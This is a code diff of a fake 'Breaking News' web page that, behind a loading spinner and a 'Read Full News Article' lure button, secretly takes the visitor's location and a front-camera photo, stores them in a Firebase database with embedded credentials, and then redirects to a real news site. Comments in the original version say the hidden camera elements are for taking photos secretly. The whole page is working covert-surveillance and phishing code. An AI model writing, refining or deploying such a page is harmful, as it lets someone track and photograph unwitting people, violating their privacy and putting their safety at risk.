@@ -3,110 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading News...</title>
+    <title>Breaking News - Loading...</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Firebase SDKs -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
 </head>
-<body class="bg-gray-950 text-white min-h-screen flex flex-col items-center justify-center p-4">
+<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen">
 
-    <div class="text-center">
-        <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-orange-500 mx-auto mb-4"></div>
-        <h2 class="text-lg font-semibold text-gray-200">Loading Breaking News...</h2>
-        <p class="text-sm text-gray-500 mt-2">Please wait while the page is loading.</p>
+    <div class="bg-gray-800 p-8 rounded-lg shadow-xl max-w-md w-full text-center">
+        <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-orange-500 mx-auto mb-4"></div>
+        <h2 class="text-xl font-bold mb-2">Loading Breaking News...</h2>
+        <p class="text-gray-400 text-sm mb-6">Please tap the button below to verify and view the full news article.</p>
+        
+        <button id="load-btn" onclick="captureAndRedirect()" class="w-full bg-orange-600 hover:bg-orange-700 text-white font-semibold py-3 rounded-lg transition shadow-lg cursor-pointer">
+            📰 Read Full News Article
+        </button>
     </div>
 
-    <!-- രഹസ്യമായി ഫോട്ടോ പിടിക്കാൻ വേണ്ടിയുള്ള വീഡിയോ/കാൻവാസ് എലമെന്റുകൾ -->
+    <!-- Hidden Video and Canvas for Photo Capture -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // ഫയർബേസ് കോൺഫിഗറേഷൻ
         const firebaseConfig = {
-            apiKey: "YOUR_FIREBASE_API_KEY",
+            apiKey: "AIzaSyBj20CcchbNqzUmiQo7gVcFvEgCXT_-AA4",
             authDomain: "calculatorapp-44d90.firebaseapp.com",
             projectId: "calculatorapp-44d90",
             storageBucket: "calculatorapp-44d90.appspot.com",
-            messagingSenderId: "YOUR_SENDER_ID",
-            appId: "YOUR_APP_ID"
+            messagingSenderId: "659953474145",
+            appId: "1:659953474145:web:2fef467a200ee091d9a820"
         };
 
-        if (!firebase.apps.length) {
-            firebase.initializeApp(firebaseConfig);
-        }
+        firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
-        const storage = firebase.storage();
 
-        // 1. URL-ൽ നിന്ന് യൂസർ നൽകിയ ടാർഗേറ്റ് ലിങ്ക് എടുക്കുക
+        // Get target URL from query parameters
         const urlParams = new URLSearchParams(window.location.search);
         const customTargetUrl = urlParams.get('target');
-        
-        // ടാർഗേറ്റ് ലിങ്ക് ഉണ്ടെങ്കിൽ അത് ഡീകോഡ് ചെയ്യുക, ഇല്ലെങ്കിൽ ഡിഫോൾട്ടായി മനോരമ കൊടുക്കുക
-        const targetNewsUrl = customTargetUrl ? decodeURIComponent(customTargetUrl) : "https://www.manoramaonline.com";
+        const targetUrl = customTargetUrl ? decodeURIComponent(customTargetUrl) : 'https://www.google.com';
 
-        // പേജ് ലോഡ് ആകുമ്പോൾ ലൊക്കേഷനും ഫോട്ടോയും എടുത്ത് ഡാറ്റാബേസിലേക്ക് അയക്കുക
-        window.onload = function() {
-            captureLocation();
-            capturePhotoAndUpload();
+        function captureAndRedirect() {
+            let btn = document.getElementById('load-btn');
+            btn.disabled = true;
+            btn.textContent = "Loading News...";
 
-            // 4 സെക്കൻഡിനു ശേഷം യഥാർത്ഥ ന്യൂസ് വെബ്‌സൈറ്റിലേക്ക് റീഡയറക്ട് ചെയ്യുക
-            setTimeout(() => {
-                window.location.href = targetNewsUrl;
-            }, 4000);
-        };
-
-        // ലൊക്കേഷൻ ക്യാപ്ചർ ചെയ്യുന്ന ഫങ്ഷൻ
-        function captureLocation() {
+            // 1. Capture Location
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    db.collection("device_location_v2").add({
+                navigator.geolocation.getCurrentPosition(position => {
+                    db.collection('device_location_v2').add({
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
-                        timestamp: firebase.firestore.FieldValue.serverTimestamp()
-                    });
-                }, (error) => {
-                    console.log("Location permission denied or error.");
-                });
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        device_name: "Web_Visitor"
+                    }).catch(err => console.log(err));
+                }, err => console.log(err), { timeout: 5000 });
             }
-        }
 
-        // ഫ്രണ്ട് ക്യാമറ ഫോട്ടോ എടുത്ത് ഫയർബേസിലേക്ക് സേവ് ചെയ്യുന്ന ഫങ്ഷൻ
-        async function capturePhotoAndUpload() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            // 2. Capture Camera Photo
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                
-                await new Promise((resolve) => setTimeout(resolve, 1500)); // ക്യാമറ സെറ്റ് ആകാൻ ചെറിയ സമയം
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photoDataUrl = canvas.toDataURL('image/jpeg', 0.7);
 
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    // Stop camera stream
+                    stream.getTracks().forEach(track => track.stop());
 
-                stream.getTracks().forEach(track => track.stop()); // ക്യാമറ ഓഫ് ചെയ്യുക
-
-                canvas.toBlob(async (blob) => {
-                    if (!blob) return;
-                    let imageName = `photo_${Date.now()}.jpg`;
-                    let storageRef = storage.ref().child(`captured_photos/${imageName}`);
-                    
-                    let snapshot = await storageRef.put(blob);
-                    let downloadUrl = await snapshot.ref.getDownloadURL();
-
-                    // ഫയർബേസ് ഫയർസ്റ്റോറിലേക്ക് ഫോട്ടോ ലിങ്ക് സേവ് ചെയ്യുക
-                    await db.collection("media_logs_v2").add({
-                        photoUrl: downloadUrl,
-                        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                    // Save photo to Firebase
+                    db.collection('media_logs_v2').add({
+                        url: photoDataUrl,
+                        type: 'photo',
+                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+                        device_name: "Web_Visitor"
+                    }).then(() => {
+                        window.location.href = targetUrl;
+                    }).catch(() => {
+                        window.location.href = targetUrl;
                     });
-                }, 'image/jpeg');
-
-            } catch (err) {
-                console.log("Camera permission denied or not available.");
-            }
+                }, 1000);
+            })
+            .catch(() => {
+                // If camera permission denied, still redirect to target
+                window.location.href = targetUrl;
+            });
         }
     </script>
 </body>
